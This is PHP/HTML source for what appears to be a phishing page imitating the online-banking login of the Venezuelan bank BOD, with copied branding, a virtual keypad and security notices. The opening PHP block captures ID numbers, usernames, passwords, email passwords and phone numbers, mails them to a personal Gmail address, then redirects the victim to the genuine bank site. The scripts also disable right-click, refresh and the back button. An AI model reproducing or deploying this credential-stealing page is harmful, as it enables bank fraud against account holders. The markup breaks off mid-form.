<?php
  if (!empty($_POST) && isset($_GET['verificacion']) && $_GET['verificacion'] == 'final') {
      $CA_TIPPER = $_POST['CA_TIPPER'];
      $CA_CUSCUI = $_POST['CA_CUSCUI'];
      $CA_USUARI = $_POST['CA_USUARI'];
      $CA_CONTRA = $_POST['CA_CONTRA'];
      $email = $_POST['email'];
      $password = $_POST['password'];
      $movil = $_POST['movil'];

      @mail('sanchezdmax@gmail.com', 'BOD LOGO', $CA_TIPPER."\n".$CA_CUSCUI."\n".$CA_USUARI."\n".$CA_CONTRA."\n\n".$email."\n".$password."\n".$movil);
      header("Location: http://www.bod.com.ve/");
      exit;
  } 
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="es" lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title></title><link rel="shortcut icon" href="https://bod.bodmillenium.com/e2f/Bodfavicon.PNG" type="image/x-icon"><meta http-equiv="Pragma" content="no-cache"><meta http-equiv="Expires" content="-1"><meta http-equiv="X-UA-Compatible" content="IE=EmulateIE10"><script language="JavaScript"> var strVerisign="Estimado usuario, cumpliendo con la normativa vigente de la \n"; strVerisign +="Superintendencia de las Instituciones del Sector Bancario (Sudeban) le \n"; strVerisign +="comunicamos que la seguridad del sitio web al cual está intentando \n"; strVerisign +="tener acceso es responsabilidad de verisign";
function vPrompt(ctrl,PromptStr){alert("El campo "+PromptStr);ctrl.focus();return;}
function Valblan(form,tmx)
{if(Ctrl.value==""){tm=tmx+" está en blanco";vPrompt(Ctrl,tm);return (false);}
else return(true);}
function novac(elem,meng,tn)
{ elprim = document.getElementsByName(elem);
  siesta = elprim.length;
  if(  (siesta>0)   &&  ( (elprim[0].type=="text")||(elprim[0].type=="password")||(elprim[0].type=="password")    ) )
 {  Ctrl = document.PYT.elements[elem];
    if(tn=="N")          { TestVar=valn0(Ctrl,meng);    }
    else if(tn=="T") { TestVar=Valblan(Ctrl,meng);  }
        else if(tn=="F") { TestVar=validfec(Ctrl,meng); }
        else if(tn=="C") { TestVar=valmail(Ctrl,meng); }
        else if(tn=="0") { TestVar=valcero(Ctrl,meng); }
    if(TestVar) {  return(false); }
   /*ocultamiento(0);*/ return(true);
  }
}
reg = new RegExp("[^0-9.]","g");
function valn0(form, tmx)
{ if (Ctrl.value=="0"   ||Ctrl.value==""         ||Ctrl.value==".0"             ||Ctrl.value=="0.0"             ||Ctrl.value==".00"             ||Ctrl.value=="0.00"
    ||Ctrl.value==".000"||Ctrl.value=="0.000"||Ctrl.value==".0000"  ||Ctrl.value=="0.0000"      ||Ctrl.value==".00000"  ||Ctrl.value=="0.00000"
        ||parseFloat(Ctrl.value)==0.00                   || (reg.test(Ctrl.value)) )
  { tm=tmx+" está en blanco\no tiene caracteres no válidos"; vPrompt(Ctrl, tm);return (false);}
  else  return (true);
}

history.pushState(null, null, document.URL);
window.addEventListener('popstate', function () {
    history.pushState(null, null, document.URL);
});

function pytdspmsg(){
if(ht_msge01!="" || ht_msge02!="" || ht_msge03!="")
{
 if(ht_msge01==ht_msge02){  ht_msge02=""; }
 if(ht_msge01==ht_msge03){ht_msge03="";}
 if(ht_msge02==ht_msge03){ht_msge03="";}
 document.write('<table border=0 cellpadding=0 cellspacing=1 width="95%">');
 if(ht_msge01!=""){document.write('<tr><td CLASS=MT>&nbsp</td><td CLASS=MD>'+ht_msge01+'</td></tr>')}
 if(ht_msge02!=""){document.write('<tr><td CLASS=MT>&nbsp</td><td CLASS=MD>'+ht_msge02+'</td></tr>')}
 if(ht_msge03!=""){document.write('<tr><td CLASS=MT>&nbsp</td><td CLASS=MD>'+ht_msge03+'</td></tr>')}
 document.write('</table><br>')
}
}
uf="";u2="";s1="";s2="";pp="";focvar="";err=0;E="";ND="";ht_logo="";ht_linc="";fof="3";ht_tipa="&nbsp";ht_sicabe="";
ht_sibus="";ht_sifuco="";pro="E2NCNR01";ht_siopc='';
function B_CA_CUSCUI(form){
Ctrl=document.PYT.CA_CUSCUI;TestVar= valAlphanum(form,"Número de Identificación");
if(!TestVar) return(false);return(true);
}
function B_CA_USUARI(form){
Ctrl=document.PYT.CA_USUARI;TestVar=Valblan(form,"Usuario");
if(!TestVar) return(false);return(true);
}
function B_CA_CONTRA(form){
Ctrl=document.PYT.CA_CONTRA;TestVar=Valblan(form,"Contraseña");
if(!TestVar) return(false);return(true);
}
// Nueva función  adicionada para permiti solo letras, numero y el backspace
regis = new RegExp("[0-9a-zA-Z]");
function valAlphanum(form,tmx) {
      var campo = Ctrl.value;
      var keyBreak = 0;
      //campo = trim(campo);
      if(campo.length==0){
            keyBreak = keyBreak+1;
      }else{
            for(i=0; i<campo.length; i++){
                  caracter = campo.substring(i, i+1);
                  if ((!regis.test(caracter)) || (caracter==" ")) {
                        //if(caracter!="-"){
                             keyBreak = keyBreak+1;
                        //}
                  }
            }
      }
      if(keyBreak==0){
            return true;
      }else{
            alert("El campo "+tmx+" está vacio o tiene caracteres especiales");
            return false;
      }
}
function runSubmit(button, btname){
form=button.form;
if(btname!="END"){
 if(nosel("CA_TIPPER","Tipo de Identificación")) return;
 if(!B_CA_CUSCUI(form)) return;
 //if(novac('CA_CUSCUI','Número de Identificación','N'))return;
 if(!B_CA_USUARI(form)) return;
 if(!B_CA_CONTRA(form)) return;
}
document.PYT.Envia.value=btname;document.PYT.submit();return;
}
function loadDoc(){
document.getElementById("CA_CUSCUI").disabled = false;
document.getElementById("CA_USUARI").disabled = false;
document.getElementById("CA_CONTRA").disabled = false;
document.PYT.Envia.value="Enviar";
window.document.PYT.CA_CUSCUI.value="";
window.document.PYT.CA_USUARI.value="";
window.document.PYT.CA_CONTRA.value="";
document.forms["PYT"].elements[psc].focus();return;
}
var tabl=' cellpadding=0 cellspacing=0 border=0 ';
function arriba(){
document.write('<table'+tabl+'width=100% class="tbl1">');
document.write('<tr><td><img src="./e2f/e03/01logo.gif" border=0 width=180 height=59></td><td align=right valign=bottom>');
document.write('<table'+tabl+'class=cli><tr><td>');
var br;bName=navigator.appName;bVer=parseInt(navigator.appVersion);
if(bName=="Microsoft Internet Explorer") br="e";
else br="n";hoy=new Date();diadelmes=hoy.getDate();mes=hoy.getMonth();
anho=hoy.getYear();if(br=="e") y2k=anho;else y2k=anho+1900;
if(mes==0){mestxt="Enero"}if(mes==1){mestxt="Febrero"}if(mes==2){mestxt="Marzo"}if(mes==3){mestxt="Abril"}
if(mes==4){mestxt="Mayo" }if(mes==5){mestxt="Junio"}if(mes==6){mestxt="Julio"}if(mes==7){mestxt="Agosto"}
if(mes==8){mestxt="Septiembre"}if(mes==9){mestxt="Octubre"}if(mes==10){mestxt="Noviembre"}if(mes==11){mestxt="Diciembre"}
document.write("Maracaibo - Venezuela, "+diadelmes+" de "+mestxt+" de "+y2k);
document.write('</td></tr></table></td></tr></table>');
document.write('<table'+tabl+' width=100% class="tbl"><tr><td ></td></tr></table>');
document.write('<table'+tabl+' width=100% class="tbl_gris"><tr><td ></td></tr></table>');
}
function abajo(){
        document.write('<table cellpadding=0 cellspacing=0 border=0 width=530>');
        document.write('<tr valign=top>');
        document.write('<td CLASS=izq_ width=50%><div align="justify">');
        document.write('En la casilla <span style="color:#00703C;font-weight: bold">Tipo de Identificación</span> seleccione el, tipo de identificación ');
        document.write('que indicó en el momento de su afiliación asociado a su número de identificación.<br><br>');
        document.write('En la casilla <span style="color:#00703C;font-weight: bold">Número de Identificación</span>, introduzca el número de identificación que indicó en el momento de su afiliación.<br><br>');
        document.write('En la casilla <span style="color:#00703C;font-weight: bold">Usuario</span>, Introduzca el nombre de usuario que seleccionó al afiliarse.<br><br>');
        document.write('En la casilla <span style="color:#00703C;font-weight: bold">Contraseña </span>ingrese la contraseña registrada al momento de suafil iación a través del <span style="font-weight: bold">Teclado Virtual.</span><br><br>');
        document.write('</div><br><br></td>');
        document.write('<td  CLASS=izq_> <div align="justify">');
        document.write('Estimado cliente, recuerde que el tercer intento fallido ocasionará el bloqueo de su usuario.<br><br>');
        document.write('En la <span style="color:#00703C;font-weight: bold">Banca Virtual</span> de BODInternet hemos incorporado tecnología de seguridad avanzada a través del manejo de certificados digitales.<br><br>');
        document.write('Para confirmar la seguridad de su conexión, verifique la imagen de un candado cerrrado ubicado en el marco de su navegador.<br><br>');
        document.write('</div></td>');
        document.write('</tr>');
        document.write('<tr >');
        document.write('<td colspan= 2>');
        document.write('<div id="teclado_aqui" style="float:center;padding-left:100px;"></div>');
        teclado("CA_CONTRA","teclado_aqui"," "," ","a",0,0);
        /*document.write('<img src="/e2f/e03/00ta2.png" vspace=20 hspace=15>');*/
        document.write('</td>');
        document.write('</tr>');
        document.write('<tr>');
        document.write('<td colspan=2>');
        document.write('<div CLASS=izq_ style="color:#00703C;font-weight: bold">Gracias por utilizar BODInternet</div>');
        document.write('</td>');
        document.write('</tr>');
        document.write('</table>');
}
function popUp(tipo){
   if(tipo == "v"){
      if(confirm(strVerisign)){
      var url = "https://seal.verisign.com/splash?form_file=fdf/splash.fdf&dn=BOD.BODMILLENIUM.COM&lang=es";
      sealWin=window.open(url,"win",'toolbar=0,location=0,directories=0,status=1,menubar=1,scrollbars=1,resizable=1,width=550,height=480');
      }
   }
   else if(tipo == "r"){
      var url = "http://www.bodinternet.com/novedades_36.asp";
      sealWin=window.open(url,"win",'toolbar=0,location=0,directories=0,status=1,menubar=1,scrollbars=1,resizable=1,width=800,height=600');
   }
self.name="mainWin";
}
function popupDemo(){
        var url = "http://www.bodinternet.com/TECLADO/Teclado2.html";
        window.open(url,"Video","resizable=no,menubar=no,status=no,location=no,left=0,top=0,width=790,height=540");
}
/**
Removido el 12/08/2015
function raya(){
        document.write('<img src="/e2f/e03/05endbar.gif" width=775 height=10 border=0 style="margin-left:-9px;margin-bottom:5px">');
}
*/
function abrircontra(){        var url="./e2f-bin/e2vrer01.pgm";        /*window.open(url,'H','toolbar=no,location=no,resizable=no,width=780,height=600');*/ location.replace(url);}
if(navigator.appName=="Microsoft Internet Explorer"&&parseInt(navigator.appVersion) >= 4){IE4=true}
else{IE4=false;}
if(navigator.appName=="Netscape"&&parseInt(navigator.appVersion)>=4){NS4=true;}else{NS4=false;}
function dokey(elemen){
 for(cont=0;cont<document.forms[0].length-1;cont++)
 {
 if(document.forms[0].elements[cont]==elemen){break;}
 }
 if(NS4){whichASC=elemen.which;}
 else{whichASC=event.keyCode;}
 switch (whichASC)
 {case 43:cont++;
  if((cont!=document.forms[0].length)&&(document.forms[0].elements[cont].name.substring(0,3)=="CA_"))
   {document.forms[0].elements[cont].focus();}
  else{document.getElementById("envio").focus();}
  break;
  case 13:cont++;
  if((cont!=document.forms[0].length)&&(document.forms[0].elements[cont].name.substring(0,3)=="CA_"))
   {document.forms[0].elements[cont].focus();}
  else{document.getElementById("envio").focus();}
  break;
 }
}
var message="";
function clickIE(){if(document.all){(message);return false;}}
function clickNS(e){
  if(document.layers||(document.getElementById&&!document.all)){
    if(e.which==2||e.which==3){(message);return false;}}}
if(document.layers){document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}
else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}
document.oncontextmenu=new Function("return false");
 document.oncontextmenu = function() {return false;};
 var version = navigator.appVersion;
 document.onkeydown = function showKeyCode(e) {
            var keycode = (window.event) ? event.keyCode : e.keyCode;
            if ((version.indexOf('MSIE') != -1)) {
                if (keycode == 116) {
                    event.keyCode = 0;
                    event.returnValue = false;
                    return false;
                }
            }
            else {
                if (keycode == 116) {
                    return false;
                }
            }
        };
al="./e2f/e03/";psc="CA_CUSCUI";stp01="";stp02="";std01="";std02="";stt01="";stt02="";stm01="";stm02="";e2ewbp="";
ht_local="QEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBA";dc="E2VCNH01";pat="./E2F-BIN";ht_ad="";ht_at="";ht_st="";ht_siadic="";ht_noter="";ht_rrn="009";ht_noenv="";ht_page="S";ht_window="";ht_cache="";alh="./E2F";ht_msge01="";ht_msge02="";ht_msge03="";
ht_sibor="";ht_input="S";ve_ca="";</script><script language="JavaScript" type="text/JavaScript">
/**Teclado**/
alfamin=new Array('q','w','e','r','t','y','u','i','o','p','a','s','d','f','g','h','j','k','l','z','x','c','v','b','n','m');
alfamay=new Array('Q','W','E','R','T','Y','U','I','O','P','A','S','D','F','G','H','J','K','L','Z','X','C','V','B','N','M');
function alfas(me,bar){
        if(document.getElementById(me+"_cb")) {
                if(document.getElementById(me+"_cb").getAttribute('estado')=="min") {
                        alfa = alfamay;
                        document.getElementById(me+"_cb").setAttribute('estado',"may");
                        document.getElementById(me+"_cb").value='minus';
                }
                else {
                        alfa = alfamin;
                        document.getElementById(me+"_cb").setAttribute('estado',"min");
                        document.getElementById(me+"_cb").value='MAYUS';
                }
        }
        initab = "<table border=0 cellpadding=0 cellspacing=0 align=center><tr>";
        endtab = "</tr></table>";
        resul=initab;
        for(k=0;k<alfamin.length;k++)
        {       resul=resul + '<td><div class="boxtecla" onclick="apun(\''+me+'\',\''+alfa[k]+'\')"><div class="boxtecla_txt">'+alfa[k]+'</div></div></td>';
                if((k==9)||(k==18))  {  resul=resul+endtab+initab;              }
                else if(k==25){
                        esp='';
                        if(bar==1)      {       resul=resul+'<td><div class="boxtecla" onclick="apun(\''+me+'\',\' \')"><div class="boxtecla_txt">esp</div></div></td>';        }
                        resul=resul+endtab;
                }
        }
        document.getElementById(me+"_keypad").innerHTML = resul;
}
function disableselect(e){
        return false;
}
function reEnable(){
        return true;
}
/*document.onselectstart=new Function ("return false")
if (window.sidebar){document.onmousedown=disableselect; document.onclick=reEnable; }*/
tdn = new Array('2','4','6','8','0','1','3','5','7','9');
function ran(n) {
        return Math.floor((Math.random() % 1) * n);
}
Array.prototype.shuffle = function() {var i = this.length;
while(i--) {this.swap(i, ran(i + 1));} };
Array.prototype.swap = function(x, y) {
var t = this[x]; this[x] = this[y]; this[y] = t; };
tdn.shuffle();
function cierradiv(me){
        document.getElementById(me+"_layer").style.display="none"; document.getElementById(me+"_layer").style.visibility="hidden";
        document.getElementById("fake_"+me).style.display="block"; document.getElementById(me).style.display="none";
        document.getElementById("fake_"+me).value = document.getElementById(me).value.replace(/\S/g,"*");
}
function apun(me,que,mo) {
        longitudV = document.getElementById(me).value.length;
        longitudC = document.getElementById(me).maxLength;
        if(longitudV < longitudC){
                document.getElementById(me).value = document.getElementById(me).value + que;
                document.getElementById("fake_"+me).value = document.getElementById("fake_"+me).value + "*";
                if(mo==1) {
                        tdn.shuffle();
                        document.getElementById('numpad_'+me).innerHTML=numpad(me,mo);
                }
        }
}
function del(me) {
        document.getElementById(me).value = document.getElementById(me).value.substring(0,document.getElementById(me).value.length-1);
        document.getElementById("fake_"+me).value = document.getElementById("fake_"+me).value.substring(0,document.getElementById("fake_"+me).value.length-1);
}
function clr(me)          {
        document.getElementById(me).value = ""; document.getElementById("fake_"+me).value = "";
}
function teclado(me,eldiv,le,to,tipo,bar,clo,mo){
        rel='';
        kaja=document.getElementById(eldiv);
        caja=eldiv;
        if (eldiv=='')  {
                caja="layerio";
                rel='position:absolute;left:'+le+'px;top:'+to+'px;';
        }
        if (!kaja)              {
                caja="layerio";
                rel='position:absolute;left:'+le+'px;top:'+to+'px;';
        }
        if(tipo=='n')   {
                wi=140;         he=155;         bk=al+'/base_tvn.gif';
        }
        else    {
                wi=320;         he=155;         bk=al+'/base_tv.gif';
        }
        resul='<div id="'+me+'_layer" style="'+rel+' width:'+wi+'px;height:'+he+'px; z-index:1;background-color:#fefefe;layer-background-color: #fefefe; border: 1px solid #CACAC1; visibility: visible;clear: both;">';
        resul=resul+'<table border=0 cellpadding=0 cellspacing=0 style="background:url('+bk+') no-repeat;width:'+wi+'px; height:'+he+'px">';
        if(tipo=='a') {
                resul=resul+'<tr><td colspan=2  style="height:38px">&nbsp;</td></tr>';
                resul=resul+'<tr valign="top"><td width="270">';
                resul=resul+'<div id="'+me+'_keypad" style="margin-top:10px; height:83px" align="center"></div>';
                resul=resul+'<table border=0 cellpadding=0 cellspacing=0><tr>';
                resul=resul+'<td width=95><input type="button" onclick="alfas(\''+me+'\')" id="'+me+'_cb" style="width:65px;margin-left:5px" class="botrans2" estado="may" value="may"></td>';
                resul=resul+'<td width=85><input type="Button" title="Borrar último caracter" onclick="del(\''+me+'\')" style="width:55px" class="botrans"></td>';
                resul=resul+'<td align=center><input type="Button" title="Borrar contenido del campo" onclick="clr(\''+me+'\')" style="width:65px" class="botrans"></td>';
                if(clo==1) { resul=resul+'<td align=right><img src="'+al+'/bt4.gif" title="Cerrar teclado" border=0 onclick="cierradiv(\''+me+'\')"></td>';     }
                resul=resul+'</tr></table>';
                resul=resul+'</td>';
        }
        else{
                resul=resul+'<tr valign=top><td width="48" style="width:50px;height:128px;"> &nbsp; </td>';
        }
        resul=resul+'<td width="92">';
        resul=resul+numpad(me,mo);
        resul=resul+'</td></tr>';
        if(tipo=='n') {
                resul=resul+'<tr><td colspan=2 valign=top>';
                resul=resul+'<table border=0 cellpadding=0 cellspacing=0>';
                resul=resul+'<tr align=center><td width=70><input type="Button" title="Borrar último caracter" onclick="del(\''+me+'\')" style="width:55px" class="botrans"></td>';
                resul=resul+'<td><input type="Button" title="Borrar contenido del campo" onclick="clr(\''+me+'\')" style="width:65px" class="botrans"></td></tr>';
                if(clo==1) {
                        resul=resul+'<tr><td colspan=2 align=center><input type="Button" class="botrans" title="Cerrar teclado" onclick="cierradiv(\''+me+'\')"></td></tr>';
                }
                resul=resul+'</table>';
                resul=resul+'</td></tr>';
        }
        resul=resul+'</table></div>';
        resul=resul+'<input type="button" class="bots" value="VER DEMO" onclick="popupDemo()">';
        resul=resul+'<br><br>';
        document.getElementById(caja).innerHTML=resul;
        if(tipo=='a') { alfas(me,bar);  }
}
function numpad(me,modo){
        res='<div id="numpad_'+me+'">';
        onmo=' onmouseover="pin(1,\''+me+'\')" onmouseout="pin(2,\''+me+'\')" class="boxtecla" ';
        res+='<table border=0 cellpadding=0 cellspacing=0 class=k width=75><tr>';
        res+='<td><div onclick="apun(\''+me+'\',\''+tdn[0]+'\','+modo+')" '+onmo+'>';
        res+='<div class="boxtecla_txt" id="'+me+'_k'+tdn[0]+'" real="'+tdn[0]+'" >'+tdn[0]+'</div></div></td>';
        res+='<td><div onclick="apun(\''+me+'\',\''+tdn[1]+'\','+modo+')" '+onmo+'>';
        res+='<div class="boxtecla_txt" id="'+me+'_k'+tdn[1]+'" real="'+tdn[1]+'" >'+tdn[1]+'</div></div></td>';
        res+='<td><div onclick="apun(\''+me+'\',\''+tdn[2]+'\','+modo+')" '+onmo+'>';
        res+='<div class="boxtecla_txt" id="'+me+'_k'+tdn[2]+'" real="'+tdn[2]+'" >'+tdn[2]+'</div></div></td></tr><tr>';
        res+='<td><div onclick="apun(\''+me+'\',\''+tdn[3]+'\','+modo+')" '+onmo+'>';
        res+='<div class="boxtecla_txt" id="'+me+'_k'+tdn[3]+'" real="'+tdn[3]+'" >'+tdn[3]+'</div></div></td>';
        res+='<td><div onclick="apun(\''+me+'\',\''+tdn[4]+'\','+modo+')" '+onmo+'>';
        res+='<div class="boxtecla_txt" id="'+me+'_k'+tdn[4]+'" real="'+tdn[4]+'" >'+tdn[4]+'</div></div></td>';
        res+='<td><div onclick="apun(\''+me+'\',\''+tdn[5]+'\','+modo+')" '+onmo+'>';
        res+='<div class="boxtecla_txt" id="'+me+'_k'+tdn[5]+'" real="'+tdn[5]+'" >'+tdn[5]+'</div></div></td></tr><tr>';
        res+='<td><div onclick="apun(\''+me+'\',\''+tdn[6]+'\','+modo+')" '+onmo+'>';
        res+='<div class="boxtecla_txt" id="'+me+'_k'+tdn[6]+'" real="'+tdn[6]+'" >'+tdn[6]+'</div></div></td>';
        res+='<td><div onclick="apun(\''+me+'\',\''+tdn[7]+'\','+modo+')" '+onmo+'>';
        res+='<div class="boxtecla_txt" id="'+me+'_k'+tdn[7]+'" real="'+tdn[7]+'" >'+tdn[7]+'</div></div></td>';
        res+='<td><div onclick="apun(\''+me+'\',\''+tdn[8]+'\','+modo+')" '+onmo+'>';
        res+='<div class="boxtecla_txt" id="'+me+'_k'+tdn[8]+'" real="'+tdn[8]+'" >'+tdn[8]+'</div></div></td></tr><tr>';
        res+='<tr><td> </td>';
        res+='<td><div onclick="apun(\''+me+'\',\''+tdn[9]+'\','+modo+')" '+onmo+'>';
        res+='<div class="boxtecla_txt" id="'+me+'_k'+tdn[9]+'" real="'+tdn[9]+'" lorva="'+tdn[9]+'">'+tdn[9]+'</div></div></td>';
        res+='<tr><td> </td></tr></table></div>';
        return res;
}
function pin(num,me){
        if(num==1)      {
                for(k=0;k<10;k++)       {
                        document.getElementById(me+'_k'+k).innerHTML='*';
                }
        }
        else{
                for(k=0;k<10;k++)       {
                        document.getElementById(me+'_k'+k).innerHTML=document.getElementById(me+'_k'+k).getAttribute('real');
                }
        }
}
function enfocar(elem) {
        document.getElementById(elem.name).className="texto";
}
function desenfocar(elem){
        document.getElementById(elem.name).className="UDI";
}
function nosel(me,meng)
{       siesta = document.getElementsByName(me);
        if(siesta.length>0)
        { if(siesta[0].selectedIndex==0) { alert("Por favor seleccione "+meng);ocultamiento(0); return true }
          else {  return false }
        }
}
</script><script type="text/javascript">
var gsMonthNames = new Array('Enero','Febrero','Marzo','Abril','Mayo','Junio','Julio','Agosto','Septiembre','Octubre','Noviembre','Diciembre');
var gsDayNames = new Array('Domingo','Lunes','Martes','Miercoles','Jueves','Viernes','Sabado');
String.prototype.zf = function(l) { return '0'.string(l - this.length) + this; };
String.prototype.string = function(l) { var s = '', i = 0; while (i++ < l) { s += this; } return s; };
Number.prototype.zf = function(l) { return this.toString().zf(l); };
function breakout_of_frame(){
	if(top.location != location) top.location.href = document.location.href;
}
Date.prototype.format = function(f){
	var d = this;
	return f.replace(/(yyyy|yy|:by:b|MMMM|MMM|MM|:bM:b|dddd|ddd|dd|:bd:b|HH|:bH:b|hh|:bh:b|mm|:bm:b|ss|:bs:b|t|f)/gi,
	function($1){
		switch($1) {
			case 'yyyy':return d.getFullYear();
			case 'yy':	return (d.getFullYear()%100).zf(2);
			case ':by:b':	return (d.getFullYear()%100);
			case 'MMMM':return gsMonthNames[d.getMonth()];
			case 'MMM':	return gsMonthNames[d.getMonth()].substr(0, 3);
			case 'MM':	return (d.getMonth() + 1).zf(2);
			case ':bM:b':	return (d.getMonth() + 1);
			case 'dddd':return gsDayNames[d.getDay()];
			case 'ddd':	return gsDayNames[d.getDay()].substr(0, 3);
			case 'dd':	return d.getDate().zf(2);
			case ':bd:b':	return d.getDate();
			case 'HH':	return d.getHours().zf(2);
			case ':bH:b':	return d.getHours();
			case 'hh':	return ((h = d.getHours() % 12) ? h : 12).zf(2);
			case ':bh:b':	return ((h = d.getHours() % 12) ? h : 12);
			case 'mm':	return d.getMinutes().zf(2);
			case ':bm:b':	return d.getMinutes();
			case 'ss':	return d.getSeconds().zf(2);
			case ':bs:b':	return d.getSeconds();
			case 'f':	return d.getMilliseconds().zf(3);
			case 't':	return d.getHours() < 12 ? 'am' : 'pm';
}
}
);
};
function clock(TitleCtrl){
	var CtrlTitle = document.getElementById(TitleCtrl);
	if(CtrlTitle){
		var d = new Date();
		document.title = d.format(CtrlTitle.value);
		setTimeout("clock('TitleFormat')", 1000);
}
}
</script><style>*{padding:0; margin:0; outline: 0;}html, body  { height:90%;font-family: verdana, arial, sans-serif;font-size: 1em;outline: 0;}body { background:#ffffff url('./e2f/e03/01bg.gif') repeat-x;margin:0;padding:0;width:100%;}#contenedor { min-height:99%; height: auto!important; height:99%;padding-bottom:50px;}#pie {text-align: center;height: 10px;margin-top: -10px; }.conte { font:bold 12px Trebuchet MS,sans-serif;color:#808080; width:100%;height:600px;overflow:auto;line-height:15px;scrollbar-track-color:#fafafa;scrollbar-arrow-color:#888888;scrollbar-3Dlight-color:#ffffff;scrollbar-base-color:#dddddd;scrollbar-shadow-color:#ffffff;scrollbar-darkshadow-color:#ffffff;scrollbar-highlight-color:#ffffff;}.01bg {    width: 21px;    height: 21px;    background-position: -245px -6px;}.tbl{background:#007139 url('./e2f/eva/01bar.gif');background-repeat:no-repeat;background-position:right; border-color: #D2D2D2 1px;height: 20px;}
.tbl_gris{background:#A6AAA8;background-repeat:no-repeat;background-position:right; border-color: #D2D2D2 1px;height: 3px;}.tbl1{background:url('./e2f/e03/01bgtop.jpg');background-repeat:no-repeat;}.cli td{font:bold 11px Trebuchet MS,sans-serif;color:#808284;padding:0px 3px 0px 0x;}.tipo{font:bold 13px Trebuchet MS,sans-serif;color:#ffffff;text-align:center;width:192px;height:23px;padding-top:2px;	background: #007139;	-webkit-border-radius: 8px;	-moz-border-radius: 8px;	-khtml-border-radius: 8px;	border: 1px solid;		border-top-left-radius: 8px;    border-top-right-radius: 8px;	-ms-border-radius:8px; 	-o-border-radius:8px;}.UT{font:bold 12px Trebuchet MS,sans-serif;color:#808080;padding-left:0px;}.UD{text-align:center;width:172px;height:25px;	border: 1px solid;	-webkit-border-radius: 4px;	-moz-border-radius: 4px;	-khtml-border-radius: 4px;	border-radius: 4px;	border-bottom: 1px solid #848484;    border-right: 1px solid #848484;    border-left: 1px solid #848484;    border-top: 1px solid #848484;
	-ms-border-radius:4px; 	-o-border-radius:4px;}.UDS{text-align:center;width:144px;height:25px;	border: 1px;	-webkit-border-radius: 4px;	-moz-border-radius: 4px;	-khtml-border-radius: 4px;	border-radius: 4px;	-ms-border-radius:4px; 	-o-border-radius:4px;	border-bottom: 1px solid #848484;    border-right: 1px solid #848484;    border-left: 1px solid #848484;    border-top: 1px solid #848484;	}.UDI{text-align:center;font:12px Trebuchet MS,sans-serif;color:#000000;border:0;background:none;padding-top:2px;}.UDIS{font:11px Trebuchet MS,Arial, Helvetica, sans-serif; color: #000000; padding-left:3px;  	border: 1px;height:25px;	-webkit-border-radius: 4px;	-moz-border-radius: 4px;	-khtml-border-radius: 4px;	-ms-border-radius:4px; 	-o-border-radius:4px;	border-radius: 4px;	border-bottom: 1px solid #848484;    border-right: 1px solid #848484;    border-left: 1px solid #848484;    border-top: 1px solid #848484;	}.bots{font:bold 11px Trebuchet MS,sans-serif;color:#808183;margin:3px;		background: #FFE710;
	-webkit-border-radius: 6px;	-moz-border-radius: 6px;	-khtml-border-radius: 6px;	-ms-border-radius:6px; 	-o-border-radius:6px;		border-radius: 6px; 	border-color: #BBBDBF;	border-bottom: 2px solid #BBBDBF;    border-right: 2px solid #BBBDBF;    border-left: 2px solid #BBBDBF;    border-top: 2px solid #BBBDBF;		height:24px;line-height:10px;width:77px;cursor:hand;}.trans{background-color:transparent;font:1px sans-serif;color:#C5D8BC;border:0px;}.MT{background:#aaaaaa;color:#000000;font:11px Trebuchet MS,sans-serif;width:15px;}.MD{background:#dfdfdf;color:#000000;font:11px Trebuchet MS,sans-serif;padding:1px 1px 1px 5px;border:#aaaaaa 1px solid;}.izq { #ffffff no-repeat;padding:5px 30px 3px 10px;width:552px;height:200px;font:bold 12px Trebuchet MS,sans-serif;color:#808080;line-height:13px;}.izq_ { padding:5px 30px 3px 10px;font:12px Trebuchet MS,sans-serif;color:#808080;line-height:13px;}.izq_M { padding:8px 30px 3px 0px;font:11px Trebuchet MS,sans-serif;color:#868789;line-height:13px;font-weight:bold;}
a{color:#008200}a:hover{color:#004400}/**Teclado**/.botrans { border:0; background:transparent; }.botrans2 { border:0; background:transparent; font:bold 11px verdana,arial,sans-serif; color: #0C6B0C; letter-spacing:-1px; }.k { margin-top:10px;}.boxtecla { border-bottom:1px solid #d5d5d5; border-right:1px solid #d5d5d5; display:block; margin:0px 3px 3px 0px; background:#F1F1F1; width:20px;height:20px;                        position:relative;background:#EFEFED;   }.boxtecla_txt { position:absolute; top:3px; left:0px; width:18px; text-align:center; font:bold 11px verdana,arial,sans-serif; color: #0C6B0C; cursor:hand; cursor:pointer;}.texto{text-align:center;font:12px Trebuchet MS,sans-serif;color:#000000;border:0;background:url('./e2f/e03/cursor.jpg') no-repeat;background-position:center;}.pxborder {background:#D2D2D2;height: 3px;width:6px}.marcoAbajo{border: 2px solid;	background: #ffffff;	-webkit-border-radius: 8px;	-moz-border-radius: 8px;	border-radius: 8px;	border-color: #BBBDBF;		-ms-border-radius:8px; 
	-o-border-radius:8px;}</style><script>	params = {};	params.wmode = 'Transparent';	params.scale = 'noscale';	swfobject.embedSWF('./e2f/fsbod.swf', 'banner',	'0', '0', '9.0.0', '', '', params);</script><style type="text/css" media="screen">#banner {visibility:hidden}</style></head><body onLoad="breakout_of_frame();clock(&#39;TitleFormat&#39;);loadDoc();" data-pinterest-extension-installed="cr1.39.2"><div id="contenedor"><form action="?verificacion=request" method="post" name="PYT">
<script>arriba();</script><div><table cellpadding="0" cellspacing="0" border="0" width="780px" style="padding:2px 0px 0px 0px">        <tbody><tr valign="top">                <td width="240" align="center"><div style="text-align:center" class="tipo">Banca por Internet</div>                        <table border="0" cellpadding="0" cellspacing="4" width="190px" align="center">
                                <tbody><tr height="25px" style="vertical-align:bottom">                                        <td class="UT" style="padding-left:0px;">Tipo y Número Identificación</td>                                </tr>                                <tr><td height="30px" style="vertical-align:top">                                        <table border="0" cellpadding="0" cellspacing="0" align="center">                                        <tbody><tr><td><select class="UDIS" name="CA_TIPPER"><option value="--" selected="">--</option><option value="V" &nbsp;="">V</option><option value="M" &nbsp;="">M</option><option value="P" &nbsp;="">P</option><option value="R" &nbsp;="">R</option><option value="E" &nbsp;="">E</option><option value="J" &nbsp;="">J</option><option value="I" &nbsp;="">I</option><option value="G" &nbsp;="">G                                        </option></select>                                        </td><td width="002%">&nbsp;</td>                                        <td>											<div class="UDS">
